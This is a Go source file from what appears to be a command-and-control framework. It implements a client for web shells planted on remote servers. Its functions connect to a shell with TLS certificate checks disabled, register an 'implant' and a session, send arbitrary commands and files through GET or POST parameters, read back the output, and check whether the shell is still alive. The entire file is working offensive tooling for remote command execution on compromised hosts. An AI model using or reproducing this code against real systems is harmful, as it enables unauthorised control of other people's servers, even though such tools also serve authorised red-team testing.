package core

import (
	"crypto/tls"
	"errors"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func StartConnector(id int, rhost string, rport int, protocol string, requestType string, command string, query string, connectString string, shellpath string) (string, error) {
	LogData("Starting new " + protocol + " connector on " + connectString)

	client := http.DefaultClient

	if protocol == "HTTPS" {
		connectString = "https://" + connectString
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr}
	} else if protocol == "HTTP" {
		connectString = "http://" + connectString
	} else {
		return "protocol specified not implemented by the connector", errors.New("protocol specified not implemented by the connector")
	}

	if requestType == "GET" {
		connectString = connectString + "?" + command + query
		resp, err := client.Get(connectString)
		if err != nil {
			return "problem reading GET request response", errors.New("problem reading GET request response")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			response := "Got a " + strconv.Itoa(resp.StatusCode) + " response, setting up session..."
			implant := RegisterImplant("Web", 0, nil, "")
			RegisterSession(SessionID, protocol, implant, rhost, rport, command, query, requestType, shellpath)
			newSession := SessionID - 1
			BroadcastSession(strconv.Itoa(newSession))
			return response, nil
		} else {
			return "the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode), errors.New("the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode))
		}
	} else if requestType == "POST" {
		commandParse := strings.Replace(command, "=", "", -1)
		data := url.Values{commandParse: {""}}

		queryParse, err := url.ParseQuery(query)
		if err != nil {
			return "problem parsing extra query parameters for POST request", errors.New("problem parsing extra query parameters for POST request")
		}

		for k, v := range queryParse {
			data.Add(string(k), strings.Join(v, ""))
		}

		resp, err := client.PostForm(connectString, data)
		if err != nil {
			return "problem reading POST request response", errors.New("problem reading POST request response")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			response := "Got a " + strconv.Itoa(resp.StatusCode) + " response, setting up session..."
			implant := RegisterImplant("Web", 0, nil, "")
			RegisterSession(SessionID, protocol, implant, rhost, rport, command, query, requestType, shellpath)
			newSession := SessionID - 1
			BroadcastSession(strconv.Itoa(newSession))
			return response, nil
		} else {
			return "the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode), errors.New("the shell doesn't appear to exist, response code was: " + strconv.Itoa(resp.StatusCode))
		}
	} else {
		return "the request type you specified is not implemented yet", errors.New("the request type you specified is not implemented yet")
	}
}

func ExecuteConnection(rhost string, rport int, protocol string, path string, commandQuery string, command string, query string, requestType string, filename string, file string) (string, error) {
	var data string

	LogData("executing on session " + strconv.Itoa(SessionID-1) + ": " + command)

	client := http.DefaultClient

	if protocol == "HTTPS" {
		protocol = "https://"
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr}
	} else if protocol == "HTTP" {
		protocol = "http://"
	} else {
		return "", errors.New("protocol specified not implemented by the connector")
	}

	if requestType == "GET" {
		connectString := protocol + rhost + "/" + path + "?" + commandQuery + url.QueryEscape(command) + query
		LogData("Connection string: " + connectString)
		if filename != "" {
			connectString += "&filename=" + filename
		}
		if file != "" {
			connectString += "&file=" + url.QueryEscape(file)
		}

		resp, err := http.Get(connectString)
		if err != nil {
			return "", errors.New("problem assigning response from server")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return "", errors.New("couldn't read the response body")
			}
			data = string(body)
		} else {
			return "", errors.New("the shell is not responding as expected (might be dead), response code was: " + strconv.Itoa(resp.StatusCode))
		}
	} else if requestType == "POST" {
		connectString := protocol + rhost + "/" + path
		commandParse := strings.Replace(commandQuery, "=", "", -1)
		postParams := url.Values{commandParse: {command}}

		queryParse, err := url.ParseQuery(query)
		if err != nil {
			return "", errors.New("problem parsing extra query parameters for POST request")
		}
		for k, v := range queryParse {
			postParams.Add(string(k), strings.Join(v, ""))
		}
		if filename != "" {
			postParams.Add("filename", filename)
		}
		if file != "" {
			postParams.Add("file", file)
		}

		resp, err := client.PostForm(connectString, postParams)
		if err != nil {
			return "", errors.New("problem assigning response from server")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			SuccessColorBold.Println("executing command... ")
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				return "", errors.New("couldn't read the response body")
			}
			data = string(body)
		} else {
			return "", errors.New("the shell is not responding as expected (might be dead), response code was: " + strconv.Itoa(resp.StatusCode))
		}
	} else {
		return "", errors.New("the request type you specified is not implemented yet")
	}
	return data, nil
}

func WebShellStatus(id int, rhost string, rport int, protocol string, requestType string, command string, query string, connectString string, shellpath string) (bool, error) {
	val, ok := Sessions.Load(ActiveSession)
	if !ok {
		return false, errors.New("session not found")
	}
	session, ok := val.(Session)
	if !ok {
		return false, errors.New("type assertion to Session failed")
	}
	sessionID := strconv.Itoa(session.ID)

	LogData("Checking in on web session:  " + sessionID)

	client := http.DefaultClient

	if protocol == "HTTPS" {
		connectString = "https://" + connectString
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
		client = &http.Client{Transport: tr}
	} else if protocol == "HTTP" {
		connectString = "http://" + connectString
	} else {
		return false, errors.New("protocol specified not implemented by the connector")
	}

	if requestType == "GET" {
		connectString = connectString + "?" + command + query
		resp, err := client.Get(connectString)
		if err != nil {
			return false, errors.New("problem reading GET request response")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			return true, nil
		} else {
			return false, nil
		}
	} else if requestType == "POST" {
		commandParse := strings.Replace(command, "=", "", -1)
		data := url.Values{commandParse: {""}}

		queryParse, err := url.ParseQuery(query)
		if err != nil {
			return false, errors.New("problem parsing extra query parameters for POST request")
		}
		for k, v := range queryParse {
			data.Add(string(k), strings.Join(v, ""))
		}

		resp, err := client.PostForm(connectString, data)
		if err != nil {
			return false, errors.New("problem reading POST request response")
		}
		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			return true, nil
		} else {
			return false, nil
		}
	} else {
		return false, errors.New("the request type you specified is not implemented yet")
	}
}
